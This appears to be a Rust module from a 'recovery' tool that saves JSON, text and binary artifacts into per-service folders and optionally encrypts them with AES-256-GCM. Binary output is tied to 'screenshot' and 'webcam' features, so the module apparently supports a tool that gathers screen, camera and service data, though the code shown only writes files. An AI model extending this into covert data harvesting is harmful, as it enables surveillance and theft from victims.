use crate::recovery::context::RecoveryContext;
use crate::recovery::fs::sanitize_label;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use rand::RngCore;
use rand::rngs::OsRng;
use serde::Serialize;
use std::path::PathBuf;
use tokio::{fs, io::AsyncWriteExt};

pub async fn write_json_artifact<T: Serialize>(
    ctx: &RecoveryContext,
    category: RecoveryCategory,
    label: &str,
    file_name: &str,
    data: &T,
) -> Result<RecoveryArtifact, RecoveryError> {
    let json = serde_json::to_vec(data)
        .map_err(|err| RecoveryError::Custom(format!("json serialization failed: {err}")))?;
    write_artifact_bytes(ctx, category, label, file_name, &json).await
}

pub async fn write_text_artifact(
    ctx: &RecoveryContext,
    category: RecoveryCategory,
    label: &str,
    file_name: &str,
    text: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    write_artifact_bytes(ctx, category, label, file_name, text.as_bytes()).await
}

#[cfg(any(feature = "screenshot", feature = "webcam"))]
pub async fn write_binary_artifact(
    ctx: &RecoveryContext,
    category: RecoveryCategory,
    label: &str,
    file_name: &str,
    data: &[u8],
) -> Result<RecoveryArtifact, RecoveryError> {
    write_artifact_bytes(ctx, category, label, file_name, data).await
}

async fn write_artifact_bytes(
    ctx: &RecoveryContext,
    category: RecoveryCategory,
    label: &str,
    file_name: &str,
    data: &[u8],
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = artifact_folder(ctx, category, label);
    fs::create_dir_all(&folder).await?;

    let control = RecoveryControl::global();
    let (payload, encrypted) = prepare_payload(control.artifact_key(), data)?;
    let final_name = artifact_file_name(file_name, encrypted);
    let target = folder.join(final_name);

    let mut file = fs::File::create(&target).await?;
    file.write_all(&payload).await?;
    file.flush().await?;

    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

fn artifact_folder(ctx: &RecoveryContext, category: RecoveryCategory, label: &str) -> PathBuf {
    ctx.output_dir
        .join("services")
        .join(category.to_string())
        .join(sanitize_label(label))
}

fn artifact_file_name(base: &str, encrypted: bool) -> String {
    if encrypted {
        format!("{base}.enc")
    } else {
        base.to_string()
    }
}

fn prepare_payload(key: Option<&[u8]>, data: &[u8]) -> Result<(Vec<u8>, bool), RecoveryError> {
    if let Some(inner) = key {
        let cipher_text = encrypt_payload(inner, data)?;
        Ok((cipher_text, true))
    } else {
        Ok((data.to_vec(), false))
    }
}

fn encrypt_payload(key: &[u8], data: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| RecoveryError::Custom(format!("artifact cipher init failed: {err}")))?;

    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let mut cipher_text = cipher
        .encrypt(nonce, data)
        .map_err(|err| RecoveryError::Custom(format!("artifact encryption failed: {err}")))?;

    let mut payload = Vec::with_capacity(nonce_bytes.len() + cipher_text.len());
    payload.extend_from_slice(&nonce_bytes);
    payload.append(&mut cipher_text);
    Ok(payload)
}
